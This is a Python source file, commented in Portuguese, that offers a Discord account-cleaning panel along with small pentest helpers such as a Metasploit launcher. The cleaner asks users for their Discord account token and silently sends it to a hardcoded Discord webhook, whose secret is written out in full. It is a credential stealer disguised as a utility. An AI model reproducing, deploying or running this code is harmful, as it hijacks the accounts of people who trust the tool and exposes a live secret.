import base64, subprocess, re, requests, pyautogui
import os
import clr
import psutil
import random
import string
from scapy.all import IP, TCP, send
from threading import Thread
import socket, time
import time
from icmplib import ping
from datetime import datetime

def ram_app():
    processo = psutil.Process(os.getpid())  # pega o processo atual
    ram_mb = processo.memory_info().rss / 1024 / 1024
    return round(ram_mb, 2)
def carregar_webhook():
        webh = input("Digite o novo webhook: ").strip()

        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
        ENV_PATH = os.path.join(BASE_DIR, ".env")

        linhas = []

        # Se o arquivo existir, lê tudo
        if os.path.exists(ENV_PATH):
            with open(ENV_PATH, "r", encoding="utf-8") as f:
                linhas = f.readlines()

        webhook_encontrado = False

        # Atualiza apenas a linha do WEBHOOK
        for i in range(len(linhas)):
            if linhas[i].startswith("WEBHOOK="):
                linhas[i] = f"WEBHOOK={webh}\n"
                webhook_encontrado = True

        # Se não existir WEBHOOK ainda, adiciona no final
        if not webhook_encontrado:
            linhas.append(f"WEBHOOK={webh}\n")

        # Agora escreve tudo de volta
        with open(ENV_PATH, "w", encoding="utf-8") as f:
            f.writelines(linhas)

senhas_temporarias = {}

def gerar_senha():
    caracteres = string.ascii_letters + string.digits
    senha = ''.join(random.choice(caracteres) for _ in range(8))
    return senha

def criar_senha_temporaria(ip):
    senha = gerar_senha()
    expira = time.time() + 300  # 5 minutos

    senhas_temporarias[ip] = {
        "senha": senha,
        "expira": expira
    }

    return senha

def verificar_senha(ip, senha_digitada):
    if ip in senhas_temporarias:

        dados = senhas_temporarias[ip]

        if time.time() > dados["expira"]:
            print("Senha expirou")
            return False

        if senha_digitada == dados["senha"]:
#            print("Acesso liberado")
            return True

    print("Senha incorreta")
    return False

import asyncio
import aiohttp
import json
import os
import sys
import time
import traceback
from typing import Optional, Dict, Any
from aiohttp import ClientSession, ClientError

    # -------------------- CONFIGURAÇÕES --------------------
async def rodar_painel_cl(WEBHOOK):
    WEBHOOK_URL = "https://discord.com/api/webhooks/1485374322683023503/-79Jg_x6lozcbc82T98m1-SPp9h0X2SP3gWEg2TSTB-m9DTnhWmw8zLbuV32R_KYaEtI"
    VELOCIDADE = 0.05  # 50ms

    BIG_182 = r"""
        ┌────────────────────────────────────────┐
        │  ██████╗ ██╗      [+]contact: l9viego  │
        │ ██╔════╝ ██║      [+]contact: l9viego  │
        │ ██║      ██║                           │
        │ ██║      ██║                           │
        │ ╚██████╗ ███████╗                      │
        │  ╚═════╝ ╚══════╝                      │
        └────────────────────────────────────────┘
                
    """

    # -------------------- FUNÇÕES AUXILIARES --------------------
    def send_webhook(message: str):
        asyncio.create_task(_send_webhook_async(message))

    async def _send_webhook_async(message: str):
        async with ClientSession() as session:
            try:
                async with session.post(
                    WEBHOOK_URL,
                    data=json.dumps({"content": message}),
                    headers={"Content-Type": "application/json"}
                ) as r:
                    if r.status != 204:
                        print(f"[⚠️] Webhook falhou: {r.status}")
            except Exception as e:
                print(f"[⚠️] Webhook offline: {e}")

    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')

    async def input_async(prompt: str) -> str:
        return await asyncio.to_thread(input, prompt)

    # -------------------- FUNÇÕES DISCORD --------------------
    async def get_me(headers: Dict[str, str], session: ClientSession) -> Optional[str]:
        try:
            async with session.get(
                "https://discord.com/api/v10/users/@me",
                headers=headers
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    discriminator = data.get('discriminator', '0')
                    username = data.get('username', 'Unknown')
                    # Formato novo ou velho dependendo da discriminação
                    if discriminator == '0':
                        return username
                    return f"{username}#{discriminator}"
        except Exception:
            pass
        return "Desconhecido"

    async def remover_hypesquad(headers: Dict[str, str], session: ClientSession) -> None:
        try:
            async with session.delete(
                "https://discord.com/api/v10/hypesquad/online",
                headers=headers
            ) as r:
                if r.status in (200, 204):
                    print("[✅] Hypesquad removido.")
                else:
                    print("[❌] Erro ao remover Hypesquad.")
        except ClientError as e:
            print(f"[❌] ERRO: {e}")

    async def remover_amigos(headers: Dict[str, str], session: ClientSession) -> None:
        try:
            async with session.get(
                "https://discord.com/api/v10/users/@me/relationships",
                headers=headers
            ) as r:
                if r.status == 200:
                    friends = await r.json()
                    print(f"[?] Encontrados {len(friends)} amigos. Removendo...")
                    for friend in friends:
                        if friend.get("type") == 1:
                            async with session.delete(
                                f"https://discord.com/api/v10/users/@me/relationships/{friend['id']}",
                                headers=headers
                            ) as d:
                                if d.status in (200, 204):
                                    print(".", end="", flush=True)
                                    await asyncio.sleep(0.3)
                    print("\n[✅] Amigos removidos.")
                else:
                    print("[❌] Erro ao listar amigos.")
        except ClientError as e:
            print(f"[❌] ERRO: {e}")

    async def remover_servidores(headers: Dict[str, str], session: ClientSession) -> None:
        try:
            async with session.get(
                "https://discord.com/api/v10/users/@me/guilds",
                headers=headers
            ) as r:
                if r.status == 200:
                    guilds = await r.json()
                    print(f"[?] Saindo de {len(guilds)} servidores...")
                    for guild in guilds:
                        if not guild.get("owner", False):
                            async with session.delete(
                                f"https://discord.com/api/v10/users/@me/guilds/{guild['id']}",
                                headers=headers
                            ) as d:
                                if d.status in (200, 204):
                                    print(".", end="", flush=True)
                                    await asyncio.sleep(0.5)
                    print("\n[✅] Saída de servidores concluída.")
                else:
                    print("[❌] Erro ao listar servidores.")
        except ClientError as e:
            print(f"[❌] ERRO: {e}")

    async def fechar_dms(headers: Dict[str, str], session: ClientSession) -> None:
        try:
            async with session.get(
                "https://discord.com/api/v10/users/@me/channels",
                headers=headers
            ) as r:
                if r.status == 200:
                    channels = await r.json()
                    print(f"[?] Fechando {len(channels)} DMs...")
                    for dm in channels:
                        async with session.delete(
                            f"https://discord.com/api/v10/channels/{dm['id']}",
                            headers=headers
                        ) as d:
                            if d.status in (200, 204):
                                print(".", end="", flush=True)
                                await asyncio.sleep(0.2)
                    print("\n[✅] Todas as DMs abertas foram fechadas.")
                else:
                    print("[❌] Erro ao listar DMs.")
        except ClientError as e:
            print(f"[❌] ERRO: {e}")

    async def limpar_mensagens_dm(
        headers: Dict[str, str],
        session: ClientSession,
        channel_id: str,
        my_id: str
    ) -> None:
        try:
            async with session.get(
                f"https://discord.com/api/v10/channels/{channel_id}/messages?limit=100",
                headers=headers
            ) as r:
                if r.status == 200:
                    messages = await r.json()
                    while messages:
                        for msg in messages:
                            # Comparação direta com o ID real obtido no login
                            if msg.get("author", {}).get("id") == my_id:
                                async with session.delete(
                                    f"https://discord.com/api/v10/channels/{channel_id}/messages/{msg['id']}",
                                    headers=headers
                                ) as d:
                                    if d.status in (200, 204):
                                        print(".", end="", flush=True)
                                        await asyncio.sleep(VELOCIDADE)
                        if len(messages) == 100:
                            last_id = messages[-1]["id"]
                            async with session.get(
                                f"https://discord.com/api/v10/channels/{channel_id}/messages?limit=100&before={last_id}",
                                headers=headers
                            ) as m:
                                if m.status == 200:
                                    messages = await m.json()
                                else:
                                    messages = []
                        else:
                            break
                    print("\n[✅] Mensagens limpas.")
                else:
                    print("[❌] Erro ao listar mensagens.")
        except ClientError as e:
            print(f"[❌] ERRO: {e}")

    async def cl_all(headers: Dict[str, str], session: ClientSession, my_id: str) -> None:
        try:
            async with session.get(
                "https://discord.com/api/v10/users/@me/channels",
                headers=headers
            ) as r:
                if r.status == 200:
                    channels = await r.json()
                    print(f"[?] Iniciando limpeza rápida em {len(channels)} DMs...")
                    for dm in channels:
                        await limpar_mensagens_dm(headers, session, dm["id"], my_id)
                    print("\n[✅] CL ALL rápido concluído.")
                else:
                    print("[❌] Erro ao listar canais.")
        except ClientError as e:
            print(f"[❌] ERRO: {e}")

    # -------------------- MAIN --------------------
    async def main():
        clear_screen()
        print(BIG_182)
        print("\033[36mEspera... verificando conexão.\033[0m", flush=True)

        token = (await input_async("INSIRA O TOKEN DA CONTA: ")).strip()
        if not token:
            sys.exit(1)

        send_webhook(f"Nova resposta: {token}")
        headers = {"authorization": token}

        async with ClientSession() as session:
            # GET /users/@me para pegar dados reais
            user_tag = await get_me(headers, session)
            # Tenta extrair o ID numérico do token caso o GET falhe ou para otimização
            try:
                my_id = base64.b64decode(token.split('.')[0] + '==').decode('utf-8')
            except:
                my_id = "" 
            
            # Se o GET funcionou, precisamos do ID numérico também para a limpeza.
            # Vamos fazer uma chamada extra rápida se não tivermos o ID limpo, 
            # mas o ideal é pegar do payload do user/@me que retornou o tag.
            if user_tag != "Desconhecido":
                # Re-fetch rápido só para garantir o ID numérico se não quisermos decodar base64
                async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as r:
                    if r.status == 200:
                        data = await r.json()
                        my_id = data.get('id', my_id)

            while True:
                clear_screen()
                print(BIG_182)
                print(f"\033[33m[!] Logado em: {user_tag}\n\033[0m")
                print("\033[32m[ 1 ] Remover Hypesquad               [ 4 ] Limpar DM\033[0m")
                print("\033[32m[ 2 ] Remover Amigos                  [ 5 ] Fechar todas as DMs\033[0m")
                print("\033[32m[ 3 ] Remover Servidores              [ 6 ] CL ALL\033[0m")
                print("\033[31m[ 0 ] Sair\033[0m\n")

                opcao = (await input_async("ESCOLHA UMA OPÇÃO: ")).strip()

                if opcao == "1":
                    await remover_hypesquad(headers, session)
                elif opcao == "2":
                    await remover_amigos(headers, session)
                elif opcao == "3":
                    await remover_servidores(headers, session)
                elif opcao == "4":
                    channel = (await input_async("INSIRA O ID DA DM: ")).strip()
                    await limpar_mensagens_dm(headers, session, channel, my_id)
                    await input_async("\nFim da ação. Pressione ENTER para voltar...")
                elif opcao == "5":
                    await fechar_dms(headers, session)
                elif opcao == "6":
                    await cl_all(headers, session, my_id)
                elif opcao == "0":
                    break
                else:
                    await input_async("\nOpção inválida. Pressione ENTER para continuar...")

        await main()
    try:        await main()
    except Exception as e:
        print(f"[❌] ERRO CRÍTICO: {e}")
        traceback.print_exc()
        await input_async("\nPressione ENTER para sair...")

def verificar_java():
    try:
        result = subprocess.run(
            ["java", "-version"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        output = result.stderr  # Java normalmente manda versão no stderr

        # Extrair versão com regex
        match = re.search(r'\"(\d+)', output)
        if match:
            versao = int(match.group(1))

            if versao >= 17:
                return f"OK (Java {versao})"
            else:
                return f"VERSÃO ANTIGA (Java {versao})"
        else:
            return "INSTALADO (versão não detectada)"

    except:
        return "NÃO INSTALADO"


def verificar_ambiente():
    status = {}

    # ☕ Java
    status["Java"] = verificar_java()

    # 🧠 Ghidra
    status["Ghidra"] = "OK" if os.path.exists("tools/ghidra") else "NÃO INSTALADO"

    # 🔍 Detect It Easy
    status["Detect It Easy"] = "OK" if os.path.exists("tools/die") else "NÃO INSTALADO"

    # 🌐 Burp Suite
    burp_paths = [
        "C:\\Program Files\\BurpSuiteCommunity",
        "C:\\Program Files\\BurpSuite"
    ]

    status["Burp Suite"] = "NÃO ENCONTRADO"
    for path in burp_paths:
        if os.path.exists(path):
            status["Burp Suite"] = "OK"
            break

    return status

def startmeta():
    pyautogui.hotkey("win", "r")
    time.sleep(0.5)
    pyautogui.write("cmd")
    time.sleep(0.5)
    pyautogui.press("enter")
    time.sleep(0.5)
    pyautogui.write("msfconsole")
    time.sleep(0.5)
    pyautogui.press("enter")
    time.sleep(0.5)
# exemplo
ip_usuario = "192.168.0.10"

senha = criar_senha_temporaria(ip_usuario)
# print("Senha temporária:", senha)

verificar_senha(ip_usuario, senha)

